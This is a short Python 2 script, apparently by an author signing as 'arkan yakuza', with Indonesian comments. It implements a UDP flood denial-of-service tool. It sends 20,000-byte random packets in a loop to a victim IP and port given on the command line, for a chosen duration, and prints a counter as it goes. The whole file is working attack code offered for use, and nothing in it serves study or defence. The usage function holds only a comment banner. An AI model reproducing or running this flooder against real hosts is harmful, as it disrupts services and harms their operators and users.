import time
import socket
import random
import sys
def usage():
 #```...---:::////++++//:-."                                     
    #                   `.-:/+osso+:-`"                                 
   #                          ```.-/oy/                                
  #      ``...----:::///////++++++++++/                                
 #```....```````````        `..-://+++/                                
     #                `.--://:--...```./.                              
     #           `.-::-..``            :ys/::::-.`                     
      #     ``.--..`                 `-ohysoooossss+/..`               
       # ``...`                     .shs:`      `.-:+sss:/`            
      #```                         .hh:               .-/syo+`         
       #                           sh-                    ohhs.        
        #                         `hy                      .:os/.      
         #                        .hy`                        `+:`     
          #                        sh/                                 
           #                       `+yho:-.````                       
            #                         `-+osyyyyyyyyyso+/:-.`           
             #                            `````````.-/+syyo++/-`       
              #                                        ``-+/-.-//:`    
               #                                           .::` `./:`  
                #                                            `/-   .:. 
                 #                                             -/`   -`
                  #                                             .+`   `
                   #                                             ./    
                    #                                             :.   
                     #                                             :   
                      #                                            .   
  #author:arkan yakuza                                                                                 
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # jadila anak bangsa yang berguna di masa depan 
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

